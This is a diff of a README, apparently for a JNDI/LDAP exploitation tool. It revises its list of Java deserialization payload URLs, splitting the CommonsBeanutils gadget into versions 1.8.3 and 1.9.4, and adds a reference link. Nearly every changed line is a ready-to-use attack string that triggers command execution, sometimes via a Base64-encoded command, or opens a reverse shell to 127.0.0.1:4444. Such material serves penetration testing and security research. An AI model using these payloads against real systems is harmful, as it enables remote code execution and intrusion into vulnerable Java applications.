@@ -260,10 +260,19 @@ ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3/Command/Base64/b3BlbiAtYS
 # CommonsCollectionsK4 反序列化 (4.0 + Runtime.exec), 功能同上
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK4/Command/open -a Calculator
 
-# CommonsBeanutils1NoCC 反序列化 (1.9.4, 无需 commons-collections 依赖), 使用 TemplatesImpl, 支持命令执行和反弹 Shell
-ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC/Command/open -a Calculator
-ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
-ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC/ReverseShell/127.0.0.1/4444
+# CommonsBeanutils 反序列化
+# 无需 commons-collections 依赖, 使用 TemplatesImpl, 支持命令执行和反弹 Shell
+# 根据 BeanComparator serialVersionUID 不同, 分为两个版本: 1.8.3 和 1.9.4
+
+# 1.8.3
+ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/Command/open -a Calculator
+ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
+ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/ReverseShell/127.0.0.1/4444
+
+# 1.9.4
+ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/Command/open -a Calculator
+ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
+ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/ReverseShell/127.0.0.1/4444
 ```
 
 ## Reference
@@ -275,3 +284,5 @@ ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC/ReverseShell/127.0.0.1/4
 [http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce](http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce)
 
 [https://www.yulegeyu.com/2022/11/12/Java 安全攻防之老版本 Fastjson 的一些不出网利用/](https://www.yulegeyu.com/2022/11/12/Java%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E4%B9%8B%E8%80%81%E7%89%88%E6%9C%ACFastjson-%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/)
+
+[https://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/](https://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/)
